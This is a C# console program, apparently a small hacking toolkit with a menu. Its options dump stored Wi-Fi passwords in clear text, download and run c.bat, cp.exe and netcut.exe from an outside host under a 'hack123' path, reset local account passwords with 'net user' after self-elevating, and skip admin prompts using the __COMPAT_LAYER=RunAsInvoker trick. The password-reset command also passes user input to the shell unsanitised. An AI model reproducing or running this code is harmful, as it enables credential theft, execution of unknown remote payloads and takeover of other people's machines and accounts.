using System;
using System.Diagnostics;
using System.Net;
using System.Security.Principal;

class Program
{
    private const string Version = "1.2.0";
    static void Main(string[] args)
    {
        string[] options = {
    "Retrieve Wi-Fi Password",
    "Download and Run c.bat",
    "Download and Run cp.exe",
    "Download and Run netcut.exe",
    "Change User Password",
    "Run .exe without admin privilegies",
    "Exit"
};
        int selectedIndex = 0;

        Console.CursorVisible = false;

        while (true)
        {
            DrawMenu(options, selectedIndex);

            ConsoleKey key = Console.ReadKey(true).Key;

            switch (key)
            {
                case ConsoleKey.UpArrow:
                    selectedIndex = (selectedIndex == 0) ? options.Length - 1 : selectedIndex - 1;
                    break;
                case ConsoleKey.DownArrow:
                    selectedIndex = (selectedIndex == options.Length - 1) ? 0 : selectedIndex + 1;
                    break;
                case ConsoleKey.Enter:
                    Console.Clear();
                    HandleOption(selectedIndex, options);
                    break;
            }
        }
    }

    static void DrawMenu(string[] options, int selectedIndex)
    {
        Console.Clear();

        for (int i = 0; i < options.Length; i++)
        {
            if (i == selectedIndex)
            {
                Console.BackgroundColor = ConsoleColor.White;
                Console.ForegroundColor = ConsoleColor.Black;
            }
            else
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.White;
            }

            Console.WriteLine($"  {options[i]}  ");
        }

        Console.ResetColor();
    }

    static void HandleOption(int index, string[] options)
    {
        switch (index)
        {
            case 0:
                GetWifiPassword();
                break;
            case 1:
                DownloadAndRunCBat();
                break;
            case 2:
                RunCPCommand();
                break;
            case 3:
                NetCut();
                break;
            case 4:
                ChangeUserPassword();
                break;
            case 5:
		CreateAndRunBat();
                break;
            case 6:
                Console.WriteLine("Exiting the program.");
                Environment.Exit(0);
                break;
        }
    }

    static void GetWifiPassword()
    {
        Console.WriteLine("Retrieving Wi-Fi passwords...");
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/C netsh wlan show profiles";
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;

        process.Start();
        string output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();

        Console.WriteLine(output);

        Console.WriteLine("Enter the Wi-Fi name (SSID) to retrieve the password: ");
        string wifiName = Console.ReadLine();
        process.StartInfo.Arguments = $"/C netsh wlan show profile name=\"{wifiName}\" key=clear";
        process.Start();
        output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();
        if (output.Contains("Key Content"))
        {
            string[] lines = output.Split('\n');
            foreach (var line in lines)
            {
                if (line.Contains("Key Content"))
                {
                    Console.WriteLine($"Wi-Fi Password: {line.Split(':')[1].Trim()}");
                    break;
                }
            }
        }
        else
        {
            Console.WriteLine("Password could not be retrieved.");
        }

        Console.ReadKey();
    }

    static void DownloadAndRunCBat()
    {
        try
        {
            Console.WriteLine("Downloading and running c.bat...");

            string command = "curl cekkistorage.cekuj.net/c.bat -o c.bat && c.bat";

            var processInfo = new ProcessStartInfo("cmd", $"/c {command}")
            {
                UseShellExecute = false,
                CreateNoWindow = false
            };

            var process = new Process { StartInfo = processInfo };
            process.Start();
            process.WaitForExit();

            Console.WriteLine("c.bat downloaded and executed successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }

        Console.WriteLine("Press any key to return to the menu...");
        Console.ReadKey();
    }

    static void RunCPCommand()
    {
        Console.WriteLine("Downloading and running cp.exe...");
        try
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("http://cekkistorage.cekuj.net/hack123/cp.exe", "cp.exe");
                Console.WriteLine("cp.exe downloaded successfully.");
                Process.Start("cp.exe");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }

        Console.ReadKey();
    }

    static void NetCut()
    {
        Console.WriteLine("Downloading and running netcut.exe...");
        try
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("http://cekkistorage.cekuj.net/hack123/netcut.exe", "netcut.exe");
                Console.WriteLine("netcut.exe downloaded and ready to execute.");
                Process.Start("netcut.exe");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }

        Console.ReadKey();
    }

static void CreateAndRunBat()
{
    Console.Write("Enter the path to the .exe file: ");
    string exePath = Console.ReadLine();

    if (!File.Exists(exePath) || Path.GetExtension(exePath).ToLower() != ".exe")
    {
        Console.WriteLine("The specified file does not exist or is not a valid .exe file.");
        Console.WriteLine("Press any key to return to the menu...");
        Console.ReadKey();
        return;
    }

    // Extract the file name without extension
    string exeFileNameWithoutExtension = Path.GetFileNameWithoutExtension(exePath);

    // Create the .bat file
    string batFileName = $"install-{exeFileNameWithoutExtension}.bat";
    string batFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, batFileName);

    try
    {
        // Write the .bat file content using the full path to the .exe file
        File.WriteAllText(batFilePath, $"set __COMPAT_LAYER=RunAsInvoker{Environment.NewLine}start \"\" \"{exePath}\"");
        Console.WriteLine($"Batch file created: {batFilePath}");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Failed to create the batch file: {ex.Message}");
        Console.WriteLine("Press any key to return to the menu...");
        Console.ReadKey();
        return;
    }

    // Run the .bat file
    try
    {
        Process process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = batFilePath,
                UseShellExecute = true,
                CreateNoWindow = true
            }
        };
        process.Start();
        process.WaitForExit();
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Failed to run the batch file: {ex.Message}");
    }

    // Delete the .bat file
    try
    {
        File.Delete(batFilePath);
        Console.WriteLine("Batch file executed and deleted successfully.");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Failed to delete the batch file: {ex.Message}");
    }

    Console.WriteLine("Press any key to return to the menu...");
    Console.ReadKey();
}


static void ChangeUserPassword()
{
    if (!IsUserAdministrator())
    {
        Console.WriteLine("This operation requires administrator privileges. Restarting with elevated privileges...");
        try
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,
                UseShellExecute = true,
                Verb = "runas"
            };

            Process.Start(processInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to restart with administrator privileges: {ex.Message}");
        }
        return;
    }

    Console.WriteLine("Retrieving user accounts on this system...");

    try
    {
        var listUsersProcess = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c net user",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        listUsersProcess.Start();
        string output = listUsersProcess.StandardOutput.ReadToEnd();
        listUsersProcess.WaitForExit();

        Console.WriteLine("List of users:");
        Console.WriteLine(output);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"An error occurred while retrieving user accounts: {ex.Message}");
        Console.WriteLine("Press any key to return to the menu...");
        Console.ReadKey();
        return;
    }
    Console.Write("Enter the username for which you want to change the password: ");
    string username = Console.ReadLine();

    Console.Write("Enter the new password (this will be visible): ");
    string password = Console.ReadLine();

    try
    {
        string command = $"net user {username} {password}";
        Console.WriteLine($"Executing command: {command}");

        var changePasswordProcess = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        changePasswordProcess.Start();
        string output = changePasswordProcess.StandardOutput.ReadToEnd();
        string errorOutput = changePasswordProcess.StandardError.ReadToEnd();
        changePasswordProcess.WaitForExit();

        if (string.IsNullOrWhiteSpace(errorOutput))
        {
            Console.WriteLine($"Password for user '{username}' has been changed successfully.");
        }
        else
        {
            Console.WriteLine($"Failed to change password. Error: {errorOutput}");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"An error occurred: {ex.Message}");
    }

    Console.WriteLine("Press any key to return to the menu...");
    Console.ReadKey();
}
static bool IsUserAdministrator()
{
    var identity = WindowsIdentity.GetCurrent();
    var principal = new WindowsPrincipal(identity);
    return principal.IsInRole(WindowsBuiltInRole.Administrator);
}
}
